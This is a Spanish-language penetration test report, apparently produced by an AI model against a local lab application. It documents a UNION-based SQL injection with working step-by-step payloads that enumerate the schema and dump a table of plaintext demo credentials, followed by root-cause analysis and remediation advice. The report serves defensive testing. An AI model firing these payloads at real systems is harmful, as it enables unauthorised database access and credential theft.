# Informe de Auditoría de Seguridad - SQL Injection
**Objetivo:** http://web.dev.local:8083  
**Fecha:** 2026-04-30 15:12:03  
**Modelo:** claude-sonnet-4.6  

---

## Resumen Ejecutivo

Se identificó y explotó exitosamente una vulnerabilidad de **SQL Injection clásica (Error-Based / UNION-Based)** en el parámetro `id` del formulario de búsqueda de usuarios. La explotación permitió extraer la totalidad de los registros de la base de datos, incluyendo credenciales en texto plano.

---

## Descripción de la Vulnerabilidad

| Campo | Detalle |
|-------|---------|
| **Tipo** | SQL Injection (In-band: Error-Based + UNION-Based) |
| **Parámetro afectado** | `id` (GET) |
| **URL vulnerable** | `http://web.dev.local:8083/?id=<payload>&Submit=Submit` |
| **CVSS v3** | 9.8 (Crítico) |
| **CWE** | CWE-89: Improper Neutralization of Special Elements used in an SQL Command |

---

## Prueba de Concepto

### 1. Confirmación de inyección (Error-Based)

**Payload:**
```
GET /?id=1'&Submit=Submit
```

**Respuesta del servidor:**
```
Fatal error: Uncaught mysqli_sql_exception: You have an error in your SQL syntax;
check the manual that corresponds to your MariaDB server version for the right
syntax to use near ''1''' at line 1 in /var/www/html/low.php:11
```

El servidor expone el error de base de datos, confirmando la vulnerabilidad y revelando:
- Motor de base de datos: **MariaDB**
- Ruta del archivo: `/var/www/html/low.php`

### 2. Determinación de columnas (ORDER BY)

```
GET /?id=1' ORDER BY 2-- -&Submit=Submit  → Resultado: OK (2 columnas)
GET /?id=1' ORDER BY 3-- -&Submit=Submit  → Error: Unknown column '3' in 'ORDER BY'
```

La consulta tiene **2 columnas**.

### 3. Identificación del contexto de base de datos (UNION-Based)

**Payload:**
```
GET /?id=-1' UNION SELECT database(),user()-- -&Submit=Submit
```

**Resultado:**
```
First name: sqli_demo
Surname: root@172.18.0.3
```

| Dato | Valor |
|------|-------|
| Base de datos activa | `sqli_demo` |
| Usuario DB | `root@172.18.0.3` |
| Bases de datos disponibles | `information_schema, sqli_demo, sys, mysql, performance_schema` |

### 4. Enumeración de tablas

**Payload:**
```
GET /?id=-1' UNION SELECT GROUP_CONCAT(table_name),2 FROM information_schema.tables WHERE table_schema=database()-- -&Submit=Submit
```

**Resultado:**
```
First name: users
```

### 5. Enumeración de columnas de la tabla `users`

**Payload:**
```
GET /?id=-1' UNION SELECT GROUP_CONCAT(column_name),2 FROM information_schema.columns WHERE table_name='users' AND table_schema=database()-- -&Submit=Submit
```

**Resultado:**
```
user_id, first_name, last_name, username, password, email
```

### 6. Extracción de credenciales

**Payload:**
```
GET /?id=-1' UNION SELECT GROUP_CONCAT(username,0x3a,password SEPARATOR '|'),GROUP_CONCAT(email) FROM users-- -&Submit=Submit
```

**Credenciales extraídas:**

| Username | Password | Email |
|----------|----------|-------|
| admin | password123 | admin@example.com |
| jsmith | secret456 | jane@example.com |
| bjohnson | mypass789 | bob@example.com |
| awilliams | qwerty123 | alice@example.com |
| cbrown | password | charlie@example.com |
| ddavis | secure123 | diana@example.com |
| emiller | hackme | eve@example.com |
| fwilson | admin123 | frank@example.com |

⚠️ **Las contraseñas están almacenadas en texto plano**, lo que agrava la criticidad de la vulnerabilidad.

---

## Causa Raíz

El código en `/var/www/html/low.php` construye la consulta SQL concatenando directamente el input del usuario sin sanitización:

```php
// Consulta vulnerable (reconstruida a partir del error)
$query = "SELECT first_name, last_name FROM users WHERE user_id='$id'";
$result = mysqli_query($conn, $query);
```

No se utiliza ningún mecanismo de protección: ni consultas preparadas (prepared statements), ni escape de caracteres, ni validación de entrada.

---

## Impacto

- **Confidencialidad:** ALTO — Exposición completa de todos los datos de la base de datos.
- **Integridad:** ALTO — Posibilidad de modificar o eliminar datos.
- **Disponibilidad:** MEDIO — Posibilidad de ejecutar operaciones destructivas.
- Acceso con usuario `root` a la base de datos, ampliando el alcance a otras bases de datos del servidor.

---

## Recomendaciones

1. **Usar Prepared Statements / Consultas Parametrizadas:**
   ```php
   $stmt = $conn->prepare("SELECT first_name, last_name FROM users WHERE user_id = ?");
   $stmt->bind_param("s", $id);
   $stmt->execute();
   ```

2. **Validar y sanitizar el input:** Verificar que el `id` sea estrictamente numérico antes de usarlo.

3. **Mínimo privilegio:** El usuario de base de datos no debe ser `root`; debe tener permisos restringidos solo a las operaciones necesarias.

4. **Deshabilitar la visualización de errores en producción:** Configurar `display_errors = Off` en `php.ini`.

5. **Hashear contraseñas:** Utilizar `password_hash()` con bcrypt/argon2 para almacenar contraseñas.

6. **Web Application Firewall (WAF):** Implementar como capa de defensa adicional.

---

## Conclusión

La aplicación en `http://web.dev.local:8083` presenta una vulnerabilidad crítica de SQL Injection que permite a un atacante no autenticado extraer la totalidad de la información de la base de datos, incluyendo credenciales de acceso en texto plano de 8 usuarios. Se requiere corrección inmediata.
